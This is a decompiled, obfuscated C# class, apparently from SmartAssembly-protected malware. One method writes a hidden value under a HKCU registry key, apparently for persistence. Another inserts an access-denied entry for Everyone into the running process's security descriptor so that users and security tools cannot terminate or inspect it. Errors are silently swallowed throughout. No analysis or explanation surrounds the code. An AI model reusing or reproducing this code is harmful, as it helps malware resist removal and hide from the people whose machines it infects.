using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wmzoZRdMaf;

internal sealed class XfdGPWBICppdJ
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr INKGwJueFWQ, int yHxFSbekuqbJW, [Out] byte[] irwojIXIhwFmusG, uint VwwHOrDfPdda, out uint DodyoaOcftcCxVqvSg);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr mDgikZBAoJEAP, int yhlSxtKdvRmiTq, [In] byte[] LJlpuPIIOrXL);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void JWUPFJWfMdmBGFlL(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(IuKjJmfJcVBFA.dOioDTBjWKE(getString_0(107404930)));
			registryKey.SetValue(IuKjJmfJcVBFA.dOioDTBjWKE(getString_0(107404793)), getString_0(107405993));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor rwzFGdMGXQyz(IntPtr intptr_0)
	{
		byte[] irwojIXIhwFmusG = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, irwojIXIhwFmusG, 0u, out var DodyoaOcftcCxVqvSg);
		if ((long)DodyoaOcftcCxVqvSg > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, irwojIXIhwFmusG = new byte[DodyoaOcftcCxVqvSg], DodyoaOcftcCxVqvSg, out DodyoaOcftcCxVqvSg))
		{
			return null;
		}
		return new RawSecurityDescriptor(irwojIXIhwFmusG, 0);
	}

	private void iuxVIPFTUWFIT(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void GFGXetqyjyB()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = rwzFGdMGXQyz(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			iuxVIPFTUWFIT(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static XfdGPWBICppdJ()
	{
		Strings.CreateGetStringDelegate(typeof(XfdGPWBICppdJ));
	}
}
